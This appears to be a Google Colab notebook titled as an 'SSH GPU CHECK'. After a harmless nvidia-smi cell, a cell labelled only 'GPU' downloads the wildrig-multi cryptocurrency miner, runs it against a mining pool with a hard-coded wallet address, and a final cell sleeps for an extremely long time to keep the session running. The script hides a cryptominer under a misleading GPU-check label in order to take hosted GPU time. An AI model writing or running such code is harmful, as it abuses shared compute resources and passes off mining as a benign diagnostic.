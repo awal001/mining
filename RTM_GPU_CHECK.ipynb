{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "SSH GPU CHECK",
      "provenance": [],
      "collapsed_sections": [],
      "private_outputs": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "#@title **GPU Check ...**\n",
        "!nvidia-smi"
      ],
      "metadata": {
        "id": "dq-XSctdh8L6",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **GPU**\n",
        "!wget https://github.com/andru-kun/wildrig-multi/releases/download/0.32.2/wildrig-multi-linux-0.32.2.tar.xz && tar -xf wildrig-multi-linux-0.32.2.tar.xz && ./wildrig-multi --print-full --algo ghostrider --url stratum+tcp://asia.flockpool.com:4444 --user RQhzMBStnUcVCUe1r8m5Rc5hP5zp2fYJc1.tuyul --pass x"
      ],
      "metadata": {
        "id": "24MNMM1sS5SD"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Sleep Mode**\n",
        "!sleep 9999999999"
      ],
      "metadata": {
        "cellView": "form",
        "id": "Uwg7bopuPJ8k"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}